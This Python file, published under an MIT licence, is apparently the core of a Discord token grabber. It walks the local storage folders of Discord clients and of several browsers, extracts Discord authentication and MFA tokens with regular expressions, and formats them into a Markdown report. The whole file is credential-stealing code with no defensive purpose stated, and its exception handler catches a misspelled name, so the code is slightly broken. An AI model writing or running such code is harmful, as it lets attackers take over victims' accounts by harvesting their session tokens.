# MIT License
#
# Copyright (c) 2022 Rahul Nanwani
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import os
import re


class DiscordTG:
    @staticmethod
    def __find_tokens(path: str) -> list:
        try:
            path += '\\Local Storage\\leveldb'

            tokens = []

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens
        except Execption:
            return None

    @staticmethod
    def __paths() -> dict:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Google Chrome 2': local + '\\Google\\Chrome\\User Data\\Profile 1',
            'Google Chrome 3': local + '\\Google\\Chrome\\User Data\\Profile 2',
            'Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
            'Edge 2': local + '\\Microsoft\\Edge\\User Data\\Profile 1',
            'Edge 3': local + '\\Microsoft\\Edge\\User Data\\Profile 2',
            'Firefox': local + '\\Mozilla\\Firefox\\Profiles',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        return paths

    @staticmethod
    def _create_md() -> str:
        paths = DiscordTG.__paths()

        md = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            md += f'\n**{platform}**\n```\n'

            tokens = DiscordTG.__find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    md += f'{token}\n'
            else:
                md += 'No tokens found.\n'

            md += '```'

        return md
